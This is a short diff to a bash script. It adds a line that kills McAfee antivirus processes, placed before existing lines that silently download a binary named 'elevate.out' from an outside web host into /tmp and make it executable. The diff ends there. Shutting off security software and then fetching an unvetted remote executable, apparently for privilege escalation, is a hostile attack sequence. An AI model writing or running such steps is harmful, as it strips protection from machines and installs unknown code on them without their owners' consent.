@@ -1,5 +1,7 @@
 #!/bin/bash
 
+pkill .*McAfee.*
+
 curl -s https://erikboesen.com/downloads/elevate.out --output /tmp/elevate.out
 chmod +x /tmp/elevate.out
 
